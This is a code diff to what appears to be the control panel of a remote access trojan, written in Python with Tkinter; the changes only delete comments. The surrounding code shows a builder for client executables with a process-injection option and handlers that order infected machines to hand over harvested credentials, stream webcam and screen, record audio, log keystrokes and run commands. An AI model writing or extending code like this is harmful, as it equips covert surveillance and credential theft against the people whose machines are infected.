@@ -1869,7 +1869,6 @@ if __name__ == "__main__":
 
         def build_exe():
             try:
-                # Get configuration values
                 config = {
                     "SERVER_IP": ip_entry.get(),
                     "SERVER_PORT": int(port_entry.get()),
@@ -1882,12 +1881,10 @@ if __name__ == "__main__":
                     "PROCESS_INJECTION": process_injection_var.get()
                 }
 
-                # Validate configuration
                 if not config["SERVER_IP"] or not config["SERVER_PORT"]:
                     self.log("Error: IP and Port are required")
                     return
 
-                # Ask for process name if injection is enabled
                 if config["PROCESS_INJECTION"]:
                     process_name = simpledialog.askstring("Process Name", "Enter the target process name (e.g., explorer.exe):")
                     if process_name:
@@ -1896,12 +1893,10 @@ if __name__ == "__main__":
                         self.log("Error: Process name is required for injection.")
                         return
 
-                # Create output directory
                 output_dir = "builds"
                 if not os.path.exists(output_dir):
                     os.makedirs(output_dir)
 
-                # Build path
                 output_path = os.path.join(output_dir, config["OUTPUT_NAME"])
 
                 self.generate_client(config, output_path)
@@ -1914,7 +1909,6 @@ if __name__ == "__main__":
                 self.log(f"Build error: {e}")
                 showerror("Error", f"Failed to build client:\n{str(e)}")
 
-        # Build button
         ttk.Button(
             main_frame,
             text="[ BUILD EXE ]",
@@ -1937,7 +1931,6 @@ if __name__ == "__main__":
                     self.webcam_viewer.title("Webcam Feed")
                     self.webcam_viewer.geometry("640x480")
                     
-                    # Create canvas for displaying webcam feed
                     self.webcam_canvas = tk.Canvas(
                         self.webcam_viewer,
                         width=640,
@@ -1946,7 +1939,6 @@ if __name__ == "__main__":
                     )
                     self.webcam_canvas.pack(fill="both", expand=True)
                     
-                    # Add stop button
                     stop_btn = ttk.Button(
                         self.webcam_viewer,
                         text="[ STOP CAPTURE ]",
@@ -1981,13 +1973,11 @@ if __name__ == "__main__":
     def receive_webcam_feed(self, client_socket):
         try:
             while self.webcam_active and hasattr(self, 'webcam_viewer'):
-                # Receive frame size
                 size_data = client_socket.recv(struct.calcsize('L'))
                 if not size_data:
                     break
                 size = struct.unpack('L', size_data)[0]
                 
-                # Receive frame data
                 frame_data = b""
                 remaining = size
                 
@@ -1998,7 +1988,6 @@ if __name__ == "__main__":
                     frame_data += chunk
                     remaining -= len(chunk)
                     
-                # Convert to image and display
                 nparr = np.frombuffer(frame_data, np.uint8)
                 frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                 
@@ -2006,14 +1995,12 @@ if __name__ == "__main__":
                     frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                     image = Image.fromarray(frame)
                     
-                    # Scale image to fit canvas
                     canvas_width = self.webcam_canvas.winfo_width()
                     canvas_height = self.webcam_canvas.winfo_height()
                     image.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
                     
                     photo = ImageTk.PhotoImage(image=image)
                     
-                    # Update canvas
                     self.webcam_canvas.delete("all")
                     self.webcam_canvas.create_image(
                         canvas_width//2,
@@ -2038,7 +2025,6 @@ if __name__ == "__main__":
                 self.process_window.geometry("800x600")
                 self.process_window.configure(bg=self.colors["bg_dark"])
                 
-                # Create process list view
                 columns = ("PID", "Name", "CPU %", "Memory %")
                 self.process_tree = ttk.Treeview(
                     self.process_window, 
@@ -2053,7 +2039,6 @@ if __name__ == "__main__":
                 
                 self.process_tree.pack(fill="both", expand=True, padx=10, pady=10)
                 
-                # Receive and display process data
                 while True:
                     try:
                         try:
@@ -2087,10 +2072,8 @@ if __name__ == "__main__":
                     self.log("Harvesting credentials...")
                     selected_client.send(b"HARVEST_CREDS")
                     
-                    # Receive data size
                     data_size = struct.unpack('L', selected_client.recv(struct.calcsize('L')))[0]
                     
-                    # Receive credential data
                     data = b''
                     remaining = data_size
                     while remaining > 0:
@@ -2100,7 +2083,6 @@ if __name__ == "__main__":
                         data += chunk
                         remaining -= len(chunk)
                     
-                    # Parse and display credentials
                     creds = json.loads(data.decode())
                     self.display_credentials(creds)
                     
@@ -2184,10 +2166,8 @@ if __name__ == "__main__":
                     self.log("Starting audio recording...")
                     selected_client.send(b"RECORD_AUDIO")
                     
-                    # Receive audio data size
                     audio_size = struct.unpack('L', selected_client.recv(struct.calcsize('L')))[0]
                     
-                    # Receive and save audio file
                     filename = f"recording_{random.randint(1000,9999)}.wav"
                     with open(filename, 'wb') as f:
                         remaining = audio_size
@@ -2251,12 +2231,10 @@ if __name__ == "__main__":
                 try:
                     self.log("Starting screen share...")
                     selected_client.send(b"START_SCREEN_SHARE")
-                    # Create screen viewer window
                     self.screen_viewer = tk.Toplevel(self.root)
                     self.screen_viewer.title("Screen Share Viewer")
                     self.screen_viewer.geometry("1024x768")
                     
-                    # Create canvas for displaying the screen
                     self.screen_canvas = tk.Canvas(
                         self.screen_viewer,
                         bg="black",
@@ -2307,7 +2285,6 @@ if __name__ == "__main__":
                     frame_data += chunk
                     remaining -= len(chunk)
 
-                # Convert to image and display
                 nparr = np.frombuffer(frame_data, np.uint8)
                 frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                 
@@ -2315,14 +2292,12 @@ if __name__ == "__main__":
                     frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                     image = Image.fromarray(frame)
                     
-                    # Scale image to fit canvas
                     canvas_width = self.screen_canvas.winfo_width()
                     canvas_height = self.screen_canvas.winfo_height()
                     image.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
                     
                     photo = ImageTk.PhotoImage(image=image)
                     
-                    # Update canvas
                     self.screen_canvas.delete("all")
                     self.screen_canvas.create_image(
                         canvas_width//2,
@@ -2344,13 +2319,11 @@ if __name__ == "__main__":
                 try:
                     self.log("Starting keylogger...")
                     selected_client.send(b"START_KEYLOGGER")
-                    # Create keylogger window
                     self.keylog_window = tk.Toplevel(self.root)
                     self.keylog_window.title("Keylogger")
                     self.keylog_window.geometry("600x400")
                     self.keylog_window.configure(bg=self.colors["bg_dark"])
                     
-                    # Add text area
                     self.keylog_text = tk.Text(
                         self.keylog_window,
                         bg=self.colors["bg_medium"],
@@ -2360,7 +2333,6 @@ if __name__ == "__main__":
                     )
                     self.keylog_text.pack(fill="both", expand=True, padx=10, pady=10)
                     
-                    # Save button
                     save_btn = ttk.Button(
                         self.keylog_window,
                         text="[ SAVE LOG ]",
@@ -2368,7 +2340,6 @@ if __name__ == "__main__":
                         style="Hacker.TButton"
                     )
                     save_btn.pack(pady=10)
-                    # Receive keystrokes
                     while True:
                         try:
                             data = selected_client.recv(BUFFER_SIZE).decode()
@@ -2523,7 +2494,6 @@ if __name__ == "__main__":
             dialog.geometry("500x200")
             dialog.configure(bg=self.colors["bg_dark"])
             
-            # Add a label
             tk.Label(
                 dialog,
                 text="Enter CMD Command:",
@@ -2532,7 +2502,6 @@ if __name__ == "__main__":
                 bg=self.colors["bg_dark"]
             ).pack(pady=10)
             
-            # Add command entry
             cmd_entry = tk.Entry(
                 dialog,
                 font=("Courier", 10),
